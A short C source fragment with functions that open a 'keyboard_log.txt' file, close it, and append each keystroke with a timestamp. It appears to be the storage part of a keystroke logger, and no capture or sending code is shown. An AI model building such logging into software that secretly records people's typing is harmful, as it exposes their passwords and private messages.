// Open the log file in append mode
void OpenLogFile() {
    logFile = fopen("keyboard_log.txt", "a");
    if (logFile == NULL) {
        printf("Failed to open log file.\n");
    }
}

// Close the log file
void CloseLogFile() {
    if (logFile != NULL) {
        fclose(logFile);
        logFile = NULL;
    }
}

// Function to log a single keystroke
void LogKeystroke(char key) {
    if (logFile) {
        fprintf(logFile, "[%s] %c\n", getCurrentTimeString(), key);
        // Flush the buffer
        fflush(logFile);
    }
}

